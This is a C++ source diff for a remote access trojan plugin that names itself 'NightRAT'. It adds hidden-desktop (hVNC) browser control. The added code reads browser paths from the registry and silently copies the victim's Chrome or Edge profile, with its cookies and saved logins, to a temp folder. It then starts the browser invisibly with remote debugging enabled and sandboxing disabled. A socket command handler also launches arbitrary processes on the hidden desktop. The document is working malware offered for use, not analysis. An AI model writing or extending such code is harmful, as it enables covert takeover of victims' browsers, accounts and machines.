@@ -4,6 +4,7 @@
 #include <commctrl.h>
 #include <uxtheme.h>
 #include <dwmapi.h>
+#include <shellapi.h>
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
@@ -1124,6 +1125,121 @@ static void input_loop() {
     }
 }
 
+static wstring get_browser_path(const wstring& browser) {
+    HKEY hKey;
+    wstring subkey;
+    if (browser == L"Google Chrome")
+        subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
+    else if (browser == L"Microsoft Edge")
+        subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe";
+    else
+        return L"";
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t path[MAX_PATH];
+        DWORD size = sizeof(path);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return wstring(path);
+        }
+        RegCloseKey(hKey);
+    }
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t path[MAX_PATH];
+        DWORD size = sizeof(path);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return wstring(path);
+        }
+        RegCloseKey(hKey);
+    }
+
+    return L"";
+}
+
+static bool copy_directory(const wstring& from, const wstring& to) {
+    wstring source = from + L'\0';
+    wstring dest = to + L'\0';
+
+    SHFILEOPSTRUCTW op = { 0 };
+    op.wFunc = FO_COPY;
+    op.pFrom = source.c_str();
+    op.pTo = dest.c_str();
+    op.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+
+    return SHFileOperationW(&op) == 0;
+}
+
+static void launch_browser_background(wstring browserName) {
+    send_status("Profiller kopyalanıyor, lütfen bekleyin...");
+
+    wstring exePath = get_browser_path(browserName);
+    if (exePath.empty()) {
+        send_error("Browser path not found in registry.");
+        return;
+    }
+
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+
+    wstring randomDir = L"NightRAT_Profile_" + to_wstring(GetTickCount());
+    wstring targetDir = wstring(tempPath) + randomDir;
+    CreateDirectoryW(targetDir.c_str(), NULL);
+
+    wstring userDataPath;
+    wchar_t localAppData[MAX_PATH];
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH)) {
+        if (browserName == L"Google Chrome")
+            userDataPath = wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default";
+        else
+            userDataPath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default";
+    }
+
+    wstring targetProfile = targetDir + L"\\Default";
+    if (!userDataPath.empty()) {
+        copy_directory(userDataPath, targetProfile);
+    }
+
+    // Modern hVNC için optimize edilmiş Chromium parametreleri
+    wstring args = L" --remote-debugging-port=9222"
+                   L" --no-first-run"
+                   L" --no-default-browser-check"
+                   L" --user-data-dir=\"" + targetDir + L"\""
+                   L" --profile-directory=\"Default\""
+                   L" --disable-gpu"
+                   L" --disable-gpu-compositing"
+                   L" --disable-software-rasterizer"
+                   L" --disable-extensions"
+                   L" --no-sandbox"
+                   L" --disable-dev-shm-usage"
+                   L" --disable-setuid-sandbox"
+                   L" --force-cpu-draw"
+                   L" --window-size=1280,720";
+
+    wstring fullCmd = L"\"" + exePath + L"\"" + args;
+
+    ensure_desktop();
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOWNORMAL;
+    PROCESS_INFORMATION pi = { 0 };
+
+    vector<wchar_t> fullCmdBuf(fullCmd.begin(), fullCmd.end());
+    fullCmdBuf.push_back(0);
+
+    if (CreateProcessW(NULL, fullCmdBuf.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status(string("Browser started: ") + (browserName == L"Google Chrome" ? "Chrome" : "Edge"));
+    } else {
+        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+    }
+}
+
 static wstring utf8_to_wstring(const string& str) {
     if (str.empty()) return wstring();
     int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
@@ -1198,25 +1314,31 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
-
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
-
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
+            string target = cmd.value("path", "cmd.exe");
+            if (target == "Google Chrome" || target == "Microsoft Edge") {
+                wstring browserName = utf8_to_wstring(target);
+                thread(launch_browser_background, browserName).detach();
             } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                wstring path = utf8_to_wstring(target);
+                vector<wchar_t> cmdLine(path.begin(), path.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
